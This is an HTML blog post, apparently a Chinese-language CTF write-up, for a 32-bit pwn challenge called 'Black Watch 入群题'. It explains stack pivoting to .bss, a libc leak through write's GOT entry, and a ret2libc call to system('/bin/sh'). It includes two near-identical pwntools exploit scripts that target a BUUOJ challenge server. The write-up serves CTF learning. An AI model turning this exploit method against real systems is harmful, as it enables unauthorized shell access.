@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Black Watch 入群题 - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>做的时候发现忘记了好多知识点 复现一下 不然本来这题的知识点以前的博客都有讲到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>没开金丝雀和pie 32位 ida看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键函数 给了两次溢出的机会 第二次只能溢出两个字长 看到这里就应该反应过来是栈迁移</p>
+<p>第一个read写入的地址是bss段</p>
+<p>这里我一开始想的是写入shellcode 打不通后仔细想了想 重新学习了NX保护</p>
+<p>NX保护简单理解就是使内存页的数据不可执行</p>
+<p>那为什么我们可以构造rop链呢 因为rop链的执行流控制是利用栈帧的ret指令来实现的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_32&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">27820</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x8048350</span></span><br><span class="line">write_plt = <span class="number">0x8048380</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x804A300</span></span><br><span class="line">leave_addr = <span class="number">0x08048408</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">system_addr,binsh_addr = libcmath(write_addr,<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>说一下思路吧  第一个read构造write泄露基址 然后要返回main函数 进行下一次的system系统调用</p>
+<p>然后栈迁移到对应的地址-4  这里的-4前面的专门讲解栈迁移的篇幅有提到</p>
+<p>接下来就是构造system的链 然后执行了</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_32&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">27820</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x8048350</span></span><br><span class="line">write_plt = <span class="number">0x8048380</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x804A300</span></span><br><span class="line">leave_addr = <span class="number">0x08048408</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">system_addr,binsh_addr = libcmath(write_addr,<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2022-11-18</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/wp/">wp</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
